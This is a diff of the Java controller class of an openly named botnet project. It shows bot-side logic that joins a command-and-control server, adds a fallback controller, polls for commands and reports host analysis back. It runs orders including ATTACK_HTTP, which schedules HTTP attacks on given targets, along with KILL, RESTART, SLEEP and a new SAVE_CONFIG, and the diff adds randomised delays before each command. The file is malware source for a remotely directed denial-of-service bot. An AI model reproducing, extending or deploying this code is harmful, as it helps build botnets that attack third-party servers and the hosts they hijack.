@@ -46,7 +46,6 @@ import com.acmutv.botnet.tool.io.IOManager;
 import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.runtime.RuntimeManager;
 import com.acmutv.botnet.tool.net.ConnectionManager;
-import com.acmutv.botnet.tool.string.TemplateEngine;
 import com.acmutv.botnet.tool.time.Duration;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonProcessingException;
@@ -59,6 +58,8 @@ import java.net.UnknownHostException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
+
+import static com.acmutv.botnet.core.control.command.CommandScope.*;
 
 /**
  * This class realizes the core business logic.
@@ -126,7 +127,7 @@ public class CoreController {
             cmd = getNextCommand();
             if (!cmd.getScope().equals(CommandScope.NONE)) {
               executeCommand(cmd);
-              if (!cmd.getScope().equals(CommandScope.RESTART)) {
+              if (!cmd.getScope().equals(RESTART)) {
                 Report hostAnalysis = makeReport();
                 sendReport(hostAnalysis);
               }
@@ -141,10 +142,9 @@ public class CoreController {
             LOGGER.warn("Cannot analyze local host. {}", exc.getMessage());
           } finally {
             if (!cmd.getScope().equals(CommandScope.KILL) &&
-                !cmd.getScope().equals(CommandScope.SHUTDOWN) &&
-                !cmd.getScope().equals(CommandScope.RESTART)) {
+                !cmd.getScope().equals(RESTART)) {
               try {
-                waitPolling(CONTROLLER.getPolling().getRandomDuration());
+                waitPolling(CONTROLLER.getPolling(AppConfigurationService.getConfigurations().getPolling()).getRandomDuration());
               } catch (InterruptedException ignored) {}
             }
           }
@@ -183,7 +183,11 @@ public class CoreController {
    * @throws  BotInitializationException when errors during botnet joining.
    */
   public static void joinBotnet() throws BotInitializationException {
-    LOGGER.traceEntry("Joining botnet...");
+    if (AppConfigurationService.getConfigurations().getControllers().isEmpty()) {
+      LOGGER.warn("No controller specified. Loading fallback controller...");
+      AppConfigurationService.getConfigurations().getControllers().add(AppConfiguration.FALLBACK_CONTROLLER);
+    }
+    LOGGER.info("Joining botnet...");
     boolean success = false;
     int controllerId = 0;
     Controller controller = null;
@@ -199,10 +203,10 @@ public class CoreController {
         success = true;
       } catch (IOException exc) {
         failures++;
-        if (failures <= controller.getReconnections()) {
+        if (failures <= controller.getReconnections(AppConfigurationService.getConfigurations().getReconnections())) {
           try {
             LOGGER.warn("Cannot connect to C&C at {}, waiting for reconnection...", initResource);
-            waitPolling(controller.getReconnectionWait().getRandomDuration());
+            waitPolling(controller.getReconnectionWait(AppConfigurationService.getConfigurations().getReconnectionWait()).getRandomDuration());
           } catch (InterruptedException ignored) { }
         } else {
           if (controllerId < AppConfigurationService.getConfigurations().getControllers().size()) {
@@ -235,34 +239,6 @@ public class CoreController {
 
     switch (cmd.getScope()) {
 
-      case RESTART:
-        final String resource = (String) cmd.getParams().get("resource");
-        if (resource == null || resource.isEmpty()) {
-          throw new BotMalformedCommandException("Cannot execute command RESTART: param [resource] is null/empty");
-        }
-        restartBot(resource);
-        break;
-
-      case SLEEP:
-        final Interval sleepTimeout = (Interval) cmd.getParams().get("timeout");
-        if (sleepTimeout == null) {
-          throw new BotMalformedCommandException("Cannot execute command SLEEP: param [timeout] is null");
-        }
-        sleep(sleepTimeout.getRandomDuration());
-        break;
-
-      case SHUTDOWN:
-        final Duration shutdownTimeout = (Duration) cmd.getParams().get("timeout");
-        if (shutdownTimeout == null) {
-          throw new BotMalformedCommandException("Cannot execute command SHUTDOWN: param [timeout] is null");
-        }
-        shutdown(shutdownTimeout);
-        break;
-
-      case KILL:
-        kill();
-        break;
-
       case ATTACK_HTTP:
         final HttpMethod method = (HttpMethod) cmd.getParams().get("method");
         @SuppressWarnings("unchecked")
@@ -279,7 +255,42 @@ public class CoreController {
             }
           }
         }
+        final Interval attackHttpDelay = (Interval) cmd.getParams().getOrDefault("delay", Interval.ZERO);
+        waitBeforeCommand(attackHttpDelay.getRandomDuration(), KILL);
         scheduleHttpAttack(method, targets);
+        break;
+
+      case KILL:
+        final Interval killTimeout = (Interval) cmd.getParams().getOrDefault("timeout", Interval.ZERO);
+        final Interval killDelay = (Interval) cmd.getParams().getOrDefault("delay", Interval.ZERO);
+        waitBeforeCommand(killDelay.getRandomDuration(), KILL);
+        kill(killTimeout.getRandomDuration());
+        break;
+
+      case RESTART:
+        final String resource = (String) cmd.getParams().get("resource");
+        if (resource == null || resource.isEmpty()) {
+          throw new BotMalformedCommandException("Cannot execute command RESTART: param [resource] is null/empty");
+        }
+        final Interval restartDelay = (Interval) cmd.getParams().getOrDefault("delay", Interval.ZERO);
+        waitBeforeCommand(restartDelay.getRandomDuration(), RESTART);
+        restartBot(resource);
+        break;
+
+      case SAVE_CONFIG:
+        final Interval saveConfigDelay = (Interval) cmd.getParams().getOrDefault("delay", Interval.ZERO);
+        waitBeforeCommand(saveConfigDelay.getRandomDuration(), SAVE_CONFIG);
+        saveConfig();
+        break;
+
+      case SLEEP:
+        final Interval sleepTimeout = (Interval) cmd.getParams().get("timeout");
+        if (sleepTimeout == null) {
+          throw new BotMalformedCommandException("Cannot execute command SLEEP: param [timeout] is null");
+        }
+        final Interval sleepDelay = (Interval) cmd.getParams().getOrDefault("delay", Interval.ZERO);
+        waitBeforeCommand(sleepDelay.getRandomDuration(), SLEEP);
+        sleep(sleepTimeout.getRandomDuration());
         break;
 
       default:
@@ -288,6 +299,35 @@ public class CoreController {
     LOGGER.traceExit();
   }
 
+  /**
+   * Waits the specified delay before the specified command execution.
+   * @param delay the time to wait.
+   * @param scope the command to wait for.
+   */
+  private static void waitBeforeCommand(Duration delay, CommandScope scope) {
+    final long amount = delay.getAmount();
+    final TimeUnit unit = delay.getUnit();
+    LOGGER.info("Waiting before command {} with delay {} {}", scope, amount, unit);
+    try {
+      unit.sleep(amount);
+    } catch (InterruptedException ignored) {}
+  }
+
+
+  /**
+   * Saves the current configuration as default.
+   * @throws BotExecutionException when configuration cannot be saved.
+   */
+  private static void saveConfig() throws BotExecutionException {
+    final String configPath = AppConfigurationService.DEFAULT_CONFIG_FILENAME;
+    LOGGER.info("Saving current configuration to file {}...", configPath);
+    try {
+      AppConfigurationService.store(AppConfigurationFormat.YAML, configPath);
+    } catch (IOException exc) {
+      throw new BotExecutionException("Configuration cannot be saved. %s", exc.getMessage());
+    }
+    LOGGER.info("Current configuration saved to file {}...", configPath);
+  }
   /**
    * Generates the bot ID [MAC_ADDRESS]-[JVM-NAME].
    * @throws SocketException when MAC cannot be read.
@@ -345,6 +385,10 @@ public class CoreController {
    */
   private static void sleep(Duration timeout) throws BotExecutionException {
     LOGGER.traceEntry("timeout={}", timeout);
+    if (timeout.getAmount() <= 0) {
+      LOGGER.traceExit();
+      return;
+    }
     LOGGER.info("Sleeping (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
     changeState(BotState.SLEEP);
     POOL.pause(timeout);
@@ -359,28 +403,17 @@ public class CoreController {
   }
 
   /**
-   * Executes the command `SHUTDOWN`.
-   * All resources are released, softly.
+   * Executes the command `KILL`.
+   * All resources are released within the specified timeout.
    * @param timeout the time to shutdown.
    */
-  private static void shutdown(Duration timeout) {
+  private static void kill(Duration timeout) {
     LOGGER.traceEntry("timeout={}", timeout);
     LOGGER.info("Shutting down the bot (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
     freeResources(timeout);
     LOGGER.info("Bot shut down");
     changeState(BotState.DEAD);
     LOGGER.traceExit();
-  }
-
-  /**
-   * Executes the command `KILL`.
-   * All resources are released, immediately.
-   */
-  private static void kill() {
-    LOGGER.info("Killing the bot...");
-    freeResources(null);
-    LOGGER.info("Bot killed");
-    changeState(BotState.DEAD);
   }
 
   /**
@@ -476,10 +509,10 @@ public class CoreController {
    */
   private static void freeResources(Duration timeout) {
     LOGGER.traceEntry("timeout={}", timeout);
-    if (timeout == null) {
-      POOL.kill();
-    } else {
+    if (timeout.getAmount() > 0) {
       POOL.shutdown(timeout);
+    } else {
+      POOL.kill();
     }
     LOGGER.traceExit();
   }
@@ -501,7 +534,7 @@ public class CoreController {
   private static void waitPolling(Duration timeout) throws InterruptedException {
     final long amount = timeout.getAmount();
     final TimeUnit unit = timeout.getUnit();
-    LOGGER.info("Waiting for {} {}", amount, unit);
+    LOGGER.info("Waiting for polling: {} {}", amount, unit);
     unit.sleep(amount);
   }
 
